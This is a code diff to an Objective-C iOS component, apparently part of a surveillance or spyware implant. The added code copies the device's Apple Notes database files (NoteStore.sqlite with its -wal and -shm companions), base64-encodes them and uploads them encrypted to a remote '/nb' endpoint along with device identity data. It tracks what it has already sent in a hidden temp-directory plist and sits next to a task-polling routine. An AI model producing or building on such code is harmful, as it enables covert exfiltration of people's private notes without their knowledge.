@@ -174,19 +174,99 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
 - (void)collectNotes {
     dispatch_async(dispatch_get_global_queue(0, 0), ^{
-        NSArray *notes = [Collector allNotes];
+        // 思路：不在设备上解析，直接把 NoteStore.sqlite（+ -wal/-shm）传回服务端，
+        // 由服务端的 parseNoteStore 统一解析（它已经支持标题/摘要/正文/时间）。
+        NSFileManager *fm = [NSFileManager defaultManager];
+        NSString *dbPath = [Collector notesDbPath];
+
+        // 先跑一次探测，保证 notesDbPath 是最新的
+        if (dbPath.length == 0) {
+            [Collector allNotes];
+            dbPath = [Collector notesDbPath];
+        }
+
         NSString *err = [Collector lastNotesError] ?: @"";
+        if (dbPath.length == 0 || ![fm isReadableFileAtPath:dbPath]) {
+            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            ev[@"et"] = @"notes_collect_failed";
+            ev[@"c"] = kSeed;
+            ev[@"list"] = @[];
+            ev[@"ctx"] = @{ @"error": err.length ? err : @"找不到可读的 NoteStore.sqlite" };
+            [self.net sendEvent:ev];
+            [self log:@"notes: 找不到库"];
+            return;
+        }
+
+        // 变更检测：主库 + -wal 的大小和修改时间，没变就不重复上传
+        NSString *walPath = [dbPath stringByAppendingString:@"-wal"];
+        NSDictionary *da = [fm attributesOfItemAtPath:dbPath error:NULL];
+        NSDictionary *wa = [fm fileExistsAtPath:walPath] ? [fm attributesOfItemAtPath:walPath error:NULL] : nil;
+        NSString *sig = [NSString stringWithFormat:@"%llu@%.0f|%llu@%.0f",
+                         [da fileSize], [[da fileModificationDate] timeIntervalSince1970],
+                         [wa fileSize], [[wa fileModificationDate] timeIntervalSince1970]];
+
+        NSMutableDictionary *sent = [self sentNotesSig];
+        if ([sent[@"sig"] isEqualToString:sig]) {
+            [self log:@"notes: 无变化，跳过上传"];
+            return;
+        }
+
+        // 打包 3 个文件（存在才传）
+        NSMutableArray *files = [NSMutableArray array];
+        NSUInteger total = 0;
+        for (NSString *suffix in @[@"", @"-wal", @"-shm"]) {
+            NSString *p = [dbPath stringByAppendingString:suffix];
+            if (![fm fileExistsAtPath:p]) continue;
+            NSData *d = [NSData dataWithContentsOfFile:p];
+            if (d.length == 0) continue;
+            total += d.length;
+            [files addObject:@{
+                @"name": [NSString stringWithFormat:@"NoteStore.sqlite%@", suffix],
+                @"data": [d base64EncodedStringWithOptions:0],
+            }];
+        }
+        if (files.count == 0) {
+            [self log:@"notes: 文件为空"];
+            return;
+        }
 
         NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
-        ev[@"et"] = (notes.count > 0) ? @"notes_collect_success" : @"notes_collect_failed";
+        ev[@"et"] = @"memo_db_upload";
         ev[@"c"] = kSeed;
-        ev[@"list"] = notes ?: @[];
-        ev[@"ctx"] = @{ @"notesCount": @(notes.count),
-                        @"error": err.length ? err : @"(none)" };
-        [self.net sendEvent:ev];
-        [self log:[NSString stringWithFormat:@"notes %lu %@",
-                   (unsigned long)notes.count, err.length ? err : @""]];
+        ev[@"db_files"] = files;
+        ev[@"ctx"] = @{ @"dbPath": [dbPath lastPathComponent],
+                        @"dbSize": @([da fileSize]),
+                        @"walSize": @(wa ? [wa fileSize] : 0),
+                        @"files": @(files.count) };
+
+        [self.net postEncrypted:@"/nb" json:ev timeout:120];
+
+        sent[@"sig"] = sig;
+        [self saveSentNotesSig:sent];
+        [self log:[NSString stringWithFormat:@"notes: 上传 %lu 个文件 %lu B",
+                   (unsigned long)files.count, (unsigned long)total]];
     });
+}
+
+#pragma mark - 备忘录库上传的变更签名
+
+- (NSString *)sentNotesPath {
+    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
+    return [dir stringByAppendingPathComponent:@".photonote_notes.plist"];
+}
+
+- (NSMutableDictionary *)sentNotesSig {
+    static NSMutableDictionary *cache = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:[self sentNotesPath]];
+        cache = [NSMutableDictionary dictionaryWithDictionary:d ?: @{}];
+    });
+    return cache;
+}
+
+- (void)saveSentNotesSig:(NSDictionary *)d {
+    [d writeToFile:[self sentNotesPath] atomically:YES];
 }
 
 #pragma mark - /taskget 轮询
